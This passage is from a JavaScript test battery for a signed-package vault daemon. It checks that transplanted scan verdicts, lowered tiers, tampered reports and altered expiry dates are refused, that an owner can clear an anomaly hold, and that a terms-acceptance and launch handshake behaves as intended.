    'LANDED in Phase 2: test/run-tests-v2-cell.mjs case D22b (tampered report refuses activation at Tier 0 first-activation and at Tier 1 every-activation, before any cell boots)');

  console.log('\n[5] tier-mutation-refused / [9] verdict-transplant-refused / [10] report-tamper-refused');
  // A FRESH tier-2 package (bad2Pkg above is superseded by case 22, and
  // the superseded gate would mask the scan/tier gates under test).
  const bad3Src = path.join(T, 'bad3.bin');
  fs.copyFileSync(badBin, bad3Src);
  const wBad3 = armor(['wrap', bad3Src, '--to', 't2-recv', '--socket', DT.socket, '--identity-dir', S2,
    '--override-scan', 'battery cases 5/9/10/23 tier-2 subject'], { input: 'OVERRIDE\n' });
  const bad3Pkg = `${bad3Src}.scripture`;
  check('fresh tier-2 subject wrapped under override', wBad3.code === 0 && fs.existsSync(bad3Pkg), wBad3.err.slice(0, 200));
  {
    const { craftResignedFile } = await import('./craft-helper.mjs');
    const cleanScanFrame = parseScriptureFile(fs.readFileSync(`${cleanBin}.scripture`, 'utf8')).frame;
    const transplanted = path.join(T, 'transplant.scripture');
    craftResignedFile(bad3Pkg, transplanted, (f) => {
      f.scan_verdict = cleanScanFrame.scan_verdict; f.scan_digest = cleanScanFrame.scan_digest;
      f.scan_report = cleanScanFrame.scan_report;
    }, S2);
    const pt = present(DT.socket, transplanted, 'transplant.out');
    const msgsT = await pt.final;
    check('verdict transplanted from a clean package beacon-refuses as scan-mismatch',
      /"reason_class":"scan-mismatch"/.test(beaconTail(R2)) && msgsT.every((m) => m.state !== 'unwrapped'),
      JSON.stringify(msgsT).slice(0, 200));
    const lowered = path.join(T, 'lowered.scripture');
    craftResignedFile(bad3Pkg, lowered, (f) => { f.armor_tier = 0; }, S2);
    const pl = present(DT.socket, lowered, 'lowered.out');
    await pl.final;
    check('quietly lowered tier beacon-refuses as tier-mismatch',
      /"reason_class":"tier-mismatch"/.test(beaconTail(R2)));
    const repPath = `${bad3Src}.scan-report.scripture`;
    const repTampered = path.join(T, 'report-tampered.scripture');
    fs.writeFileSync(repTampered, flipBodyChar(fs.readFileSync(repPath, 'utf8')));
    const pr = present(DT.socket, repTampered, 'report-t.out');
    await pr.final;
    check('tampered report package beacon-refuses (bad frame signature)',
      /"reason_class":"bad-frame-signature"/.test(beaconTail(R2)));
  }

  console.log('\n[23] beacon-anomaly-quarantine (tier-2)');
  {
    const { craftResignedFile } = await import('./craft-helper.mjs');
    const bad3Frame = parseScriptureFile(fs.readFileSync(bad3Pkg, 'utf8')).frame;
    const exp = new Date(Date.parse(bad3Frame.expiry) + 3600 * 1000).toISOString();
    const mism = path.join(T, 't2-expiry-mismatch.scripture');
    craftResignedFile(bad3Pkg, mism, (f) => { f.expiry = exp; }, S2);
    const pm = present(DT.socket, mism, 'mism.out');
    await pm.final;
    check('expiry-mismatch presentation beacons', /"reason_class":"expiry-mismatch"/.test(beaconTail(R2)));
    const st = await rpcOnce(DT.socket, { cmd: 'status' });
    check('status reports the anomaly on the tier-2 entry', st.anomalies >= 1, JSON.stringify(st.anomalies));
    const held = present(DT.socket, bad3Pkg, 'bad3-held.out');
    const heldMsgs = await held.final;
    const heldLast = heldMsgs[heldMsgs.length - 1];
    check('the honest tier-2 package is now REFUSED (anomaly-hold) until the owner clears it',
      heldLast?.ok === false && /anomaly-hold/.test(heldLast?.error || ''), JSON.stringify(heldLast).slice(0, 200));
    const cleared = await ownerRpc(DT.socket, { cmd: 'clear-anomaly', canary: bad3Frame.canary });
    check('owner clear-anomaly releases the hold', cleared.ok === true && cleared.cleared >= 1, JSON.stringify(cleared));
    const pa = await presentAndApprove(DT.socket, bad3Pkg, 'bad3-after-clear.out', { dual: true });
    check('after clearing, the honest package unwraps again (dual approval)',
      pa.last?.state === 'unwrapped' && sha256Hex(fs.readFileSync(path.join(R2, 'out', 'bad3-after-clear.out'))) === sha256Hex(fs.readFileSync(badBin)));
  }
  DT.proc.kill('SIGTERM');
  await sleep(300);

  console.log('\n[26] untiered-part-named');
  defer('[26] untiered part activation refusal + naming at activation',
    'LANDED in Phase 2: test/run-tests-v2-cell.mjs case D26 (repo activation refuses NAMING the untiered part; the same tree tier-wrapped activates whole)');

  // ===================== Steer surfaces: terms / launch ==============
  console.log('\n[T1] terms handshake (owner + agent acceptance)');
  {
    const DS = mkStore('terms-side');
    const Dm = await startDaemon(DS);
    const t = await rpcOnce(Dm.socket, { cmd: 'terms' });
    check('daemon presents terms with version + content hash',
      t.terms_version === TERMS_VERSION && t.terms_sha256 === termsSha256());
    const stale = await ownerRpc(Dm.socket, { cmd: 'accept-terms', agent: 'battery-agent', accept: true, terms_sha256: 'deadbeef' });
    check('acceptance against a stale hash refused', stale.ok === false && /terms-stale/.test(stale.error || ''));
    const acc = await ownerRpc(Dm.socket, { cmd: 'accept-terms', agent: 'battery-agent', accept: true, terms_sha256: termsSha256() });
    check('agent acceptance recorded', acc.ok === true && acc.accepted === 'agent:battery-agent');
    const accFile = JSON.parse(fs.readFileSync(path.join(DS, 'acceptance.json'), 'utf8'));
    const agentRec = accFile.agents?.['battery-agent'];
    check('acceptance is an auditable on-disk record (subject, version, hash, time)',
      !!agentRec && agentRec.subject === 'agent:battery-agent' && agentRec.terms_sha256 === termsSha256() && !!agentRec.accepted_at,
      JSON.stringify(accFile).slice(0, 200));
    check('terms text states the capability rule (agents keep their hands)',
      /keep their hands/i.test(t.terms) && /never takes a capability away/i.test(t.terms)
      && /full tool calling, plugins/i.test(t.terms));
    check('terms text follows the writing rule (plain first, technical in parentheses)',
      /fingerprint the moment it leaves \(the/.test(t.terms));
    Dm.proc.kill('SIGTERM');
    await sleep(200);
    console.log('\n[T2] launch command (one copy-paste command, idempotent)');
    // Refusal first: no ACCEPT typed => nothing activates, exit 1.
    const lsNo = run(NODE, [LAUNCH, '--identity-dir', DS], { input: 'nope\n' });
    check('launch without ACCEPT starts nothing (exit 1)',
      lsNo.code === 1 && /not activated/.test(lsNo.err + lsNo.out), (lsNo.out + lsNo.err).slice(0, 160));
    // The real launch runs the daemon in the foreground: spawn async.
    const launchProc = spawn(NODE, [LAUNCH, '--identity-dir', DS], { stdio: ['pipe', 'pipe', 'pipe'] });
    let launchOut = '';
    launchProc.stdout.on('data', (d) => { launchOut += d; });
    launchProc.stderr.on('data', (d) => { launchOut += d; });
    launchProc.stdin.write('ACCEPT\n');
    let st = null;
    for (let i = 0; i < 40 && !st; i++) {
      st = await rpcOnce(path.join(DS, 'vaultd.sock'), { cmd: 'status' }).catch(() => null);
      if (!st) await sleep(250);
    }
    check('launch presents the terms before activating', /ACTIVATION TERMS/.test(launchOut), launchOut.slice(0, 160));
    check('launch leaves a running daemon after ACCEPT', !!st && st.ok === true);
    const accAfter = JSON.parse(fs.readFileSync(path.join(DS, 'acceptance.json'), 'utf8'));
    check('owner acceptance recorded by launch', !!accAfter.owner && accAfter.owner.subject === 'owner');
    const ls2 = run(NODE, [LAUNCH, '--identity-dir', DS], { input: '' });
    check('second launch is idempotent (reports already running, exit 0)',
      ls2.code === 0 && /already running/.test(ls2.out + ls2.err), (ls2.out + ls2.err).slice(0, 160));
    launchProc.kill('SIGTERM');
    await sleep(300);
  }

  console.log(`\n==== Closure 1 battery: ${passed} passed, ${failed} failed, ${deferred} deferred(phase2) ====`);
  if (failures.length) console.log(`failed: ${failures.join(' | ')}`);
  process.exitCode = failed ? 1 : 0;
}

main().catch((err) => { console.error(`battery error: ${err.stack || err.message}`); process.exitCode = 1; });
